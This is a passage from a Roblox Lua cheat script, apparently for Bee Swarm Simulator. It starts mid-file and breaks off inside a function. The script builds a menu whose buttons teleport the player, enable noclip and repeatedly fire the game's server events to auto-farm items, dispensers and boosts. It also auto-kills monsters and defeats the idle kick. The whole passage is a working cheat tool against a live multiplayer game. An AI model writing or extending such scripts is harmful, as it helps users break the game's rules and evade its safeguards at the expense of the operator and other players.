ExtrasButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SettingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
HomePage.Visible = true
FarmingPage.Visible = false
WaypointPage.Visible = false
ExtraPage.Visible = false
SettingPage.Visible = false
end)
 
FarmingButton.MouseButton1Down:Connect(function()
HomeButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
FarmingButton.BackgroundColor3 = Color3.new(0.345098, 0.14902, 1)
WaypointsButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
ExtrasButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SettingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
HomePage.Visible = false
FarmingPage.Visible = true
WaypointPage.Visible = false
ExtraPage.Visible = false
SettingPage.Visible = false
end)
 
WaypointsButton.MouseButton1Down:Connect(function()
HomeButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
FarmingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
WaypointsButton.BackgroundColor3 = Color3.new(0.345098, 0.14902, 1)
ExtrasButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SettingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)  
HomePage.Visible = false
FarmingPage.Visible = false
WaypointPage.Visible = true
ExtraPage.Visible = false
SettingPage.Visible = false
end)
 
 
local UserInputService = game:GetService("UserInputService")
 
local function onInputEnded(inputObject, gameProcessedEvent)
    -- First check if the 'gameProcessedEvent' is true
    -- This indicates that another script had already processed the input, so this one can be ignored
    if gameProcessedEvent then return end
    -- Next, check that the input was a keyboard event
    if inputObject.UserInputType == Enum.UserInputType.Keyboard then
        if inputObject.KeyCode == Enum.KeyCode.Home then --NÃºt home Ä‘Ã³ng m? ui
            if MiniPage.Visible == true then
            MiniPage.Visible =  false
        elseif MiniPage.Visible == false then
            MiniPage.Visible = true
        end
    end
end
end
UserInputService.InputEnded:Connect(onInputEnded)
 
 
ExtrasButton.MouseButton1Down:Connect(function()
HomeButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
FarmingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
WaypointsButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
ExtrasButton.BackgroundColor3 = Color3.new(0.345098, 0.14902, 1)
SettingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
HomePage.Visible = false
FarmingPage.Visible = false
WaypointPage.Visible = false
ExtraPage.Visible = true
SettingPage.Visible = false
end)
 
SettingButton.MouseButton1Down:Connect(function()
HomeButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
FarmingButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
WaypointsButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
ExtrasButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SettingButton.BackgroundColor3 = Color3.new(0.345098, 0.14902, 1)
HomePage.Visible = false
FarmingPage.Visible = false
WaypointPage.Visible = false
ExtraPage.Visible = false
SettingPage.Visible = true
end)
 
Destroy.MouseButton1Down:Connect(function()
MiniPage:TweenPosition(UDim2.new(0.361979187, 0, -0.7, 0))
wait(1)
DarkCyberMainGUI:Destroy()
end)
 
Destroy.MouseEnter:Connect(function()
Destroy.TextColor3 = Color3.new(255,0,0)
end)
 
Destroy.MouseLeave:Connect(function()
Destroy.TextColor3 = Color3.new(255,255,255)
end)
 
Close.MouseButton1Down:Connect(function()
if Close.Text == "-" then
      MainPage.Visible = false
      Close.Text ="+"
else
      MainPage.Visible = true
      Close.Text = "-"
end
end)
 
local Waypoints = {
 
["Tunnel Bear"] = CFrame.new(507.3, 5.7, -45.7),
["Redfield Boost"] = CFrame.new(-332, 20, 244),
["Bluefield Boost"] = CFrame.new(319, 58, 103),
["MountainTop Boost"] = CFrame.new(-40, 176, -191.7),
["Bee Shop"] = CFrame.new(-136.8, 4.6, 243.4),
["Tool Shop"] = CFrame.new(86, 4.6, 294),
["Tool Shop 2"] = CFrame.new(165, 69, -161),
["MountainTop Shop"] = CFrame.new(-18, 176, -137),
["Red Clubhouse"] = CFrame.new(-334, 21, 216),
["Blue Clubhouse"] = CFrame.new(292, 4, 98),
["Ticket Shop"] = CFrame.new(-12.8, 184, -222.2),
["Club Honey"] = CFrame.new(44.8, 5, 319.6),
["RoyalJelly Shop"] = CFrame.new(-297, 53, 68),
["Ticket RoyalJelly Shop"] = CFrame.new(81, 18, 240),
["Honeystorm Dispensor"] = CFrame.new(238.4, 33.3, 165.6),
["Blueberry Dispenser"] = CFrame.new(313.3, 58, 86.9),
["Strawberry Dispenser"] = CFrame.new(-320.5, 46, 272.5),
["Sprout Dispenser"] = CFrame.new(-269.26, 26.56, 267.31),
["Instant Honey Convertor"] = CFrame.new(282, 68, -62),
["King Beetles Lair"] = CFrame.new(218, 3, 140),
["Clover Field"] = CFrame.new(174, 34, 189),
["Mushroom Field"] = CFrame.new(-258.1, 5, 299.7),
["Spider Field"] = CFrame.new(-57.2, 20, -5.3),
["Blue Field"] = CFrame.new(113.7, 4, 101.5),
["Sunflower Field"] = CFrame.new(-208, 4, 185),
["StrawBerry Field"] = CFrame.new(-169.3, 20, -3.2),
["Red Field"] = CFrame.new(-258.1, 5, 299.7),
["Dandelion Field"] = CFrame.new(-30, 4, 225),
["BamBoo Field"] = CFrame.new(93, 20, -25),
["Rose Field"] = CFrame.new(-322, 20, 124),
["Mushroom Field"] = CFrame.new(-94, 5, 116),
["Cactus Field"] = CFrame.new(-194, 68, -107),
["Pumpkin Field"] = CFrame.new(-194, 68, -182),
["MountainTop Field"] = CFrame.new(76, 176, -181),
["PineTree Field"] = CFrame.new(-318, 68, -150),
["Pineapple Field"] = CFrame.new(262, 68, -201),
["Onett"] = CFrame.new(-8.4, 234, -517.9),
["Gumdrop Dispenser"] = CFrame.new(63, 20.7, 38.7),
["Treat Dispenser"] = CFrame.new(193.9, 68, -123),
["Treat Shop"] = CFrame.new(-228.2, 5, 89.4),
["Star Hut"] = CFrame.new(135.9, 64.6, 322.1),
["Wealth Clock"] = CFrame.new(310.5, 47.6, 190),
["Coconut Field"] = CFrame.new(-255,72,459),
["Pepper Patch"] = CFrame.new(-486,124,517),
["CCN"] = CFrame.new(-176,71,534),
["Nuoc"] = CFrame.new(-426,70,38),
["Moon"] = CFrame.new(21,88,-54),
["Kill Snail"] = CFrame.new(420,117,-178),
["CC"] = CFrame.new(270,25260,-718),
["CC1"] = CFrame.new(-147,5,195),
["CC2"] = CFrame.new(-431,70,-53),
["CC3"] = CFrame.new(-23,318,-270),
["CC4"] = CFrame.new(-405,110,545),
["CC5"] = CFrame.new(136,66,322),
["CC6"] = CFrame.new(-270,28,267),
["CC7"] = CFrame.new(312,49,189),
["CC8"] = CFrame.new(218,5,140),
["Ant"] = CFrame.new(112,32,477),
["CC9"] = CFrame.new(592,7,-46),
["CC12"] = CFrame.new(-500,52,458),
["CC13"] = CFrame.new(291,28,271),
["CC14"] = CFrame.new(272,25268,-773),
["CC15"] = CFrame.new(-336,133,-387),
["CC16"] = CFrame.new(218,5,140),
["CC17"] = CFrame.new(218,5,140),
["CC19"] = CFrame.new(-486,142,410),
["CC18"] = CFrame.new(218,5,140)
}
 
local nightbell = false
Autokillmonster.MouseButton1Down:connect(function()
if nightbell == false then
      Autokillmonster.BackgroundColor3 = red
      MainPage.Visible = false
      Close.Text ="+"
      nightbell = true
      while nightbell do
            wait(5)
             local A = {
 
            ["Name"] = "Night Bell"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      end
else
      nightbell = false
       Autokillmonster.BackgroundColor3 = blue
end
     
end)
WindyBeetp.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC19"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Diamondmasktp.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC15"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Demonmasktp.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC13"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Stinger.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Ant"]
      MainPage.Visible = false
      Close.Text ="+"
end)
 
TunelBeartp.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Tunnel Bear"]
      MainPage.Visible = false
      Close.Text ="+"
end)
GummyMask.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC14"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Coconutshoptp.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CCN"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Petaltp.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC12"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Stumptp.MouseButton1Down:connect(function()
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Kill Snail"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Suntp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Sunflower Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Dantp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Dandelion Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Clovertp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Clover Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Bambootp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["BamBoo Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Blueftp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Blue Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Mushtp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Mushroom Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Spidertp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Spider Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Strawtp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["StrawBerry Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Pineappletp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Pineapple Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Rosetp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Rose Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Castustp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Cactus Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Pumtp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Pumpkin Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Pintreetp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["PineTree Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Toptp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["MountainTop Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Coconuttp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Coconut Field"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Peppertp.MouseButton1Down:connect(function()
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Pepper Patch"]
      MainPage.Visible = false
      Close.Text ="+"
end)
 
 
Autored.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
      local a = "Red Field Booster"
local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
Event:FireServer(a)
      while wait(10) do
local a = "Red Field Booster"
local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
Event:FireServer(a)
end
end)
Autoblue.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
      local a = "Blue Field Booster"
local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
Event:FireServer(a)
      while wait(10) do
local a = "Blue Field Booster"
local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
Event:FireServer(a)
      end
end)
 
AutoDispenser_2.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
     
local a = "Field Booster"
local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
Event:FireServer(a)
      while wait(10) do
local a = "Field Booster"
local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
Event:FireServer(a)
      end
     
end)
 
local afksnail = false
Afkstumptp.MouseButton1Down:connect(function(l)
if afksnail == false then
      afksnail = true
      Afkstumptp.BackgroundColor3 = red
      MainPage.Visible = false
      Close.Text ="+"
      noclip = true
      while afksnail do
            wait()
           
            local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Kill Snail"]
      end
else
      afksnail = false
      Afkstumptp.BackgroundColor3 = blue
end
end)
 
     
     
 
Shopbasictp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Tool Shop"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Shopproctp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Tool Shop 2"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Shoptoptp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["MountainTop Shop"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Shopsprinklertp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Nuoc"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Shopmoontp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Moon"]
      MainPage.Visible = false
      Close.Text ="+"
end)
 
 
InstantConversiontp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC1"]
      MainPage.Visible = false
      Close.Text ="+"
end)
MegaMemorytp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC2"]
      MainPage.Visible = false
      Close.Text ="+"
end)
NightMemorytp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC3"]
      MainPage.Visible = false
      Close.Text ="+"
end)
ExtremeMemorytp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC4"]
      MainPage.Visible = false
      Close.Text ="+"
end)
StartHalltp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC5"]
      MainPage.Visible = false
      Close.Text ="+"
end)
SummonSprouttp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC6"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Anttp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Ant"]
      MainPage.Visible = false
      Close.Text ="+"
end)
Kingamulettp.MouseButton1Down:connect(function()
     
local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["CC8"]
      MainPage.Visible = false
      Close.Text ="+"
end)
 
--auto
 
 
local dispenser = false
AutoDispenser.MouseButton1Down:connect(function()
if dispenser == false then
      dispenser = true
      AutoDispenser.BackgroundColor3 = red
      MainPage.Visible = false
      Close.Text ="+"
      while dispenser do
            wait(5)
     
      local A_1 = "Glue Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Wealth Clock"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Coconut Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Strawberry Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Treat Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Free Ant Pass Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Blueberry Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Honey Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  local A_1 = "Free Royal Jelly Dispenser"
                  local Event = game:GetService("ReplicatedStorage").Events.ToyEvent
                  Event:FireServer(A_1)
                  end
else
      dispenser = false
      AutoDispenser.BackgroundColor3 = blue
end
end)
 
 
 
 
 
 
 
Dropweapon.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
end)
 
 
 
 
local killtunell = false
KillTunnel.MouseButton1Down:connect(function(j)
      if killtunell == false then
      MainPage.Visible = false
      Close.Text ="+"
      local uTorso = workspace:WaitForChild(game.Players.LocalPlayer.Name).HumanoidRootPart
      uTorso.CFrame = Waypoints["Tunnel Bear"]
      killtunell = true
      KillTunnel.BackgroundColor3 = red
      noclip = true
      for _,v in pairs(game.workspace.Decorations.TrapTunnel:GetChildren()) do
      if string.find(v.Name,"") then
            v:Destroy()
 
      end
      end
      wait(6)
      while killtunell do
            wait()
      for _,v in pairs(game.Workspace.Monsters:GetChildren()) do
      if string.find(v.Name,"Tunnel") then
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,20.5,0)
 
      end
      end
      end
      else
      noclip = false    
      killtunell = false
      KillTunnel.BackgroundColor3 = blue
end
end)
 
 
 
 
 
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "o" then
noclip = not noclip
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
 
 
 
 
 
local killcoconut = false
Killcoconutcrab.MouseButton1Down:connect(function()
      if killcoconut == false then
            MainPage.Visible = false
      Close.Text ="+"
      Killcoconutcrab.BackgroundColor3 = red
      killcoconut = true
      noclip = true
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-256.375092, 112.547897, 500.457794, 0.998952866, -0.0450557806, 0.00794458669, -8.64538929e-09, 0.173648775, 0.98480767, -0.0457508452, -0.98377645, 0.173466951)
else
      killcoconut = false
      noclip = false
      Killcoconutcrab.BackgroundColor3 = blue
end
end)
 
 
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
  vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
  wait(1)
  vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
print ("Afk 15m")
end)
 
 
 
 
local stinger = false
Autostinger.MouseButton1Down:connect(function(b)
if stinger == false then
      MainPage.Visible = false
      Close.Text ="+"
      stinger = true
      Autostinger.BackgroundColor3 = red
      local A = {
 
            ["Name"] = "Stinger"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      while stinger do
            wait(30)
     
            local A = {
 
            ["Name"] = "Stinger"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      end
else
      stinger = false
      Autostinger.BackgroundColor3 = blue
end
 
end)
 
 
 
local item = false
Autobuffitem.MouseButton1Down:connect(function(c)
if item == false then
      MainPage.Visible = false
      Close.Text ="+"
      item = true
      Autobuffitem.BackgroundColor3 = red
      local A = {
 
            ["Name"] = "Blue Extract"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Red Extract"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Oil"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Enzymes"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Glue"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Glitter"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Tropical Drink"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      while item do
            wait(600)
     
            local A = {
 
            ["Name"] = "Blue Extract"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Red Extract"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Oil"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Enzymes"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Glue"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Glitter"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      local A = {
 
            ["Name"] = "Tropical Drink"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
     
      end
     
else
      item = false
      Autobuffitem.BackgroundColor3 = blue
end
end)
 
 
 
local gliter = false
Autogliter.MouseButton1Down:connect(function(d)
if gliter == false then
      MainPage.Visible = false
      Close.Text ="+"
      gliter = true
      Autogliter.BackgroundColor3 = red
      local A = {
 
            ["Name"] = "Glitter"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      while gliter do
            wait(920)
     
            local A = {
 
            ["Name"] = "Glitter"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
     
     
            end
else
      gliter = false
      Autogliter.BackgroundColor3 = blue
end
end)
 
 
 
local coconut = false
Autococonut.MouseButton1Down:connect(function(e)
if coconut == false then
      MainPage.Visible = false
      Close.Text ="+"
      coconut = true
      Autococonut.BackgroundColor3 = red
      local A = {
 
            ["Name"] = "Coconut"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
      while coconut do
            wait(11)
     
            local A = {
 
            ["Name"] = "Coconut"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
     
      end
else
      coconut = false
      Autococonut.BackgroundColor3 = blue
end
end)
 
     
 
 
 
     
local AutoDig = false
Autodig.MouseButton1Down:connect(function()
      if AutoDig == false then
            MainPage.Visible = false
      Close.Text ="+"
      AutoDig = true
      Autodig.BackgroundColor3 = red
      while AutoDig do
            wait(0.5)
           
 for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
      if v:IsA("Tool") then
            v.ClickEvent:FireServer()
     
      end
            end
            end
else
      AutoDig = false
      Autodig.BackgroundColor3 = blue
end
end)
 
 
 
local Sparkles = false
Useglitter.MouseButton1Down:connect(function()
 
if Sparkles == false then
       MainPage.Visible = false
      Close.Text ="+"
      Sparkles = true
      Useglitter.BackgroundColor3 = red
local test = "C"
local tweenservice = game:GetService("TweenService")
local plr = game.Players.LocalPlayer
local info = TweenInfo.new(0.1) -- change to how long it takes to get to the item (in seconds)
local item = {}
while Sparkles do
wait(0.5)
for _,v in pairs(game.workspace.Flowers:GetDescendants()) do
if string.find(v.Name,"Sparkles") then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
end
end
for k,v in pairs(workspace.Collectibles:GetChildren()) do
 if tostring(v) == tostring(game.Players.LocalPlayer.Name) or tostring(v) == test then
                        if (v.Position-plr.Character.HumanoidRootPart.Position).magnitude <= 60 then
item.CFrame = CFrame.new(v.Position.x,plr.Character.HumanoidRootPart.Position.y,v.Position.z)
local Tween = tweenservice:Create(plr.Character.HumanoidRootPart, info, item)
Tween:Play()
end
end
end
end
 
else
      Sparkles = false
      Useglitter.BackgroundColor3 = blue
end
end)
 
 
 
 
 
 
 
local gumdrop = false
Autogumdrop.MouseButton1Down:connect(function(h)
      if gumdrop == false then
            MainPage.Visible = false
      Close.Text ="+"
      gumdrop = true
      Autogumdrop.BackgroundColor3 = red
      while gumdrop do
            wait(2)
           
            local A = {
 
            ["Name"] = "Gumdrops"
      }
      local Event = game:GetService("ReplicatedStorage").Events.PlayerActivesCommand
      Event:FireServer(A)
     
            end
else
      gumdrop = false
      Autogumdrop.BackgroundColor3 = blue
end
end)
 
Equipgummymask.MouseButton1Down:connect(function()
      MainPage.Visible = false
      Close.Text ="+"
      local A_1 = "Equip"
local A_2 =
{
      ["Mute"] = true,
      ["Type"] = "Gummy Mask",
      ["Category"] = "Accessory"
}
local Event = game:GetService("ReplicatedStorage").Events.ItemPackageEvent
Event:InvokeServer(A_1, A_2)
end)
 
local tpwindy = false
Autokillwindy.MouseButton1Down:connect(function(o)
     
      if tpwindy == false then
      tpwindy = true
      MainPage.Visible = false
      Close.Text ="+"
      Autokillwindy.BackgroundColor3 =red
      noclip = true
    local player = game.Players.LocalPlayer
    local sanghuman = player.Character.HumanoidRootPart
 
      while tpwindy do
            wait()
           
     for _,v in pairs(game.workspace.Monsters:GetChildren()) do
      if string.find(v.Name,"Windy") then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Torso.CFrame * CFrame.new(0,25,0)
end
end
 for k,r in pairs(workspace.Collectibles:GetChildren()) do
            if tostring(r) == tostring(game.Players.LocalPlayer.Name) or tostring(r) == "C" then
                        if (r.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 25 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = r.CFrame
                local intvalue = Instance.new("IntValue",r)
                intvalue.Name = "Void"
end
end
end
      end
else
